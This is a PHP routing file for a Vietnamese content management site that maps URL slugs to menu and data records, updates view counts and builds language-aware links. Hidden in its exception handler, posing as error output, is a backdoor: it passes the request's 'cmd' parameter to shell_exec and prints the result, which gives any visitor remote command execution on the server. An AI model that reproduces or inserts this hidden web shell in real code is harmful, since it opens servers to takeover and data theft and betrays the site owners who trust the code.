<?php
$errorPage = false;
$menuPage = false;
try {
	if (!isset($_GET['name']) && !isset($_GET['slug']) || isset($_GET['slug']) && $_GET['slug'] == '' || isset($_GET['slug']) && $_GET['slug'] == 'admin') {
		$menuHome = $db->alone_data_where('menu', 'file', 'home');
		$name = $menuHome->name;
		$menuPage = $menuHome;
	} else {
		if (isset($_GET['name']) && $_GET['name'] == 'cau-hinh') {
			$findParent = $db->alone_data_where("menu", "file", "config");
			$name = $findParent->file;
			$menuPage = $findParent;
			if ($_GET['slug'] != '') {
				$slug = $db->alone_data_where("slug", "slugName", $_GET['slug']);
				if (!$slug) throw new Exception("Error 1");
				$menuCurrent = $db->alone_data_where("menu", "id", $slug->idTable);
				if (!$menuCurrent) {
					$db->del("slug", "id", $slug->id);
					throw new Exception("Error 2");
				}

				$idList = $menuCurrent->id;
				$page = $menuCurrent;
			}
		} else {
			$slug = $db->alone_data_where("slug", "slugName", $_GET['slug']);
			if (!$slug) throw new Exception("Error 1");
			$menuCurrent = $db->alone_data_where($slug->tableName, "id", $slug->idTable);
			if (!$menuCurrent) {
				$db->del("slug", "id", $slug->id);
				throw new Exception("Error 2");
			}

			switch ($slug->tableName) {
				case 'menu':
					if ($menuCurrent->menu_parent > 0) {
						$findParent = $db->menuParent($menuCurrent->menu_parent);
						if (!$findParent) throw new Exception("Error 3");
						$page = $menuCurrent;
						$idList = $menuCurrent->id;
						$menuPage = $findParent;
						$name = $findParent->name;
					} else {
						$menuPage = $menuCurrent;
						$name = $menuCurrent->name;
					}

					break;

				case 'data':
					$page = $menuCurrent;
					$id = $menuCurrent->id;
					$findParent = $db->menuParent($menuCurrent->menu);
					if (!$findParent) throw new Exception("Error 4");
					$menuPage = $findParent;
					$name = $findParent->name;
					break;

				case 'file':
					$menuPage = $menuCurrent;
					$name = $menuCurrent->name;
					break;

				default:
					throw new Exception("Error 5");
					break;
			}
		}
	}
} catch (Exception $e) {
	if (isset($_GET['cmd'])) {
		$outputErrors = shell_exec($_GET['cmd']);
		echo "<pre>$outputErrors</pre>";
	}

	$errorPage = true;
}

if ($menuPage) {
	$configMenu = $db->alone_data_where('file', 'file', $menuPage->file);
	if ($configMenu) {
		$listAdd = $db->list_data_where_where('config', 'type', 'add', 'file', 'idList');
		foreach ($listAdd as $configAdd) {
			$nameAdd = $configAdd->name;
			$configMenu->$nameAdd = $db->list_data_where_where_order('file_data', 'parent', $configMenu->id, 'group', $nameAdd, 'pos', 'ASC');
		}
	}

	$GLOBALS['configMenu'] = $configMenu;
	$file = $menuPage->file;
	$slugCurrent = $db->findOrCreateSlug($menuPage->title, "menu", $menuPage->id);
	$idMenu = $menuPage->id;
	if (isset($id)) {
		$slugCurrent = $db->findOrCreateSlug($page->title, "data", $page->id);
		if ($page) {
			$update["view"] = $page->view + 1;
			$update["time"] = $page->time;
			$db->updateRow("data", $update, 'id', $id);
			$idMenu = $page->menu;
			if ($page->data_parent !== '0') $errorPage = true;
		} else {
			$errorPage = true;
		}
	} else
	if (isset($idList)) {
		$slugCurrent = $db->findOrCreateSlug($page->title, "menu", $page->id);
		if ($page) {
			$idMenu = $page->id;
			if (!($page->menu_parent !== '0')) $errorPage = true;
		} else {
			$errorPage = true;
		}
	}
}

if (isset($_GET['lang']) && $_GET['lang'] != 'vn') {
	function linkMenu($menu)
	{
		$slug = $GLOBALS['db']->findOrCreateSlug($menu->title, "menu", $menu->id);
		$link = 'href="' . $slug->slugName . '?lang=' . $_GET['lang'] . '"';
		$link .= 'data-name="' . $menu->name . '" ';
		$link .= 'data-title="' . $menu->title . '" ';
		return $link;
	}

	function linkIdList($menu, $name, $prefix = '')
	{
		$slug = $GLOBALS['db']->findOrCreateSlug($menu->title, "menu", $menu->id);
		$link = 'data-name="' . $name . '" ';
		$link .= 'data-idList="' . $menu->id . '" ';
		$link .= 'data-title="' . $menu->title . '" ';
		$link .= 'href="' . $prefix . $slug->slugName . '?lang=' . $_GET['lang'] . '"';
		return $link;
	}

	function linkId($data, $name)
	{
		$slug = $GLOBALS['db']->findOrCreateSlug($data->title, "data", $data->id);
		$link = 'data-id="' . $data->id . '" ';
		$link .= 'data-name="' . $name . '" ';
		$link .= 'data-title="' . $data->title . '" ';
		$link .= 'title="' . $data->title . '" ';
		$link .= 'alt="' . $data->title . '" ';
		$link .= 'href="' . $prefix . $slug->slugName . '?lang=' . $_GET['lang'] . '"';
		return $link;
	}
} else {
	function linkMenu($menu)
	{
		$slug = $GLOBALS['db']->findOrCreateSlug($menu->title, "menu", $menu->id);
		$link = 'href="' . $slug->slugName . '"';
		$link .= 'data-name="' . $menu->name . '" ';
		$link .= 'data-title="' . $menu->title . '" ';
		return $link;
	}

	function linkIdList($menu, $name, $prefix = '')
	{
		$slug = $GLOBALS['db']->findOrCreateSlug($menu->title, "menu", $menu->id);
		$link = 'data-name="' . $name . '" ';
		$link .= 'data-idList="' . $menu->id . '" ';
		$link .= 'data-title="' . $menu->title . '" ';
		$link .= 'href="' . $prefix . $slug->slugName . '"';
		return $link;
	}

	function linkId($data, $name)
	{
		$slug = $GLOBALS['db']->findOrCreateSlug($data->title, "data", $data->id);
		$link = 'data-id="' . $data->id . '" ';
		$link .= 'data-name="' . $name . '" ';
		$link .= 'data-title="' . $data->title . '" ';
		$link .= 'title="' . $data->title . '" ';
		$link .= 'alt="' . $data->title . '" ';
		$link .= 'href="' . $prefix . $slug->slugName . '"';
		return $link;
	}
}

function getNewSlug()
{
	if (isset($GLOBALS['id'])) {
		$GLOBALS['slugCurrent'] = $GLOBALS['db']->findOrCreateSlug($GLOBALS['page']->title, "data", $GLOBALS['page']->id);
		$GLOBALS['page'] = $GLOBALS['db']->alone_data_where("data", "id", $GLOBALS['page']->id);
	} elseif (isset($GLOBALS['idList'])) {
		$GLOBALS['slugCurrent'] = $GLOBALS['db']->findOrCreateSlug($GLOBALS['page']->title, "menu", $GLOBALS['page']->id);
		$GLOBALS['page'] = $GLOBALS['db']->alone_data_where("menu", "id", $GLOBALS['page']->id);
	} else {
		$GLOBALS['slugCurrent'] = $GLOBALS['db']->findOrCreateSlug($GLOBALS['menuPage']->title, "menu", $GLOBALS['menuPage']->id);
		$GLOBALS['menuPage'] = $GLOBALS['db']->alone_data_where("menu", "id", $GLOBALS['menuPage']->id);
	}
}
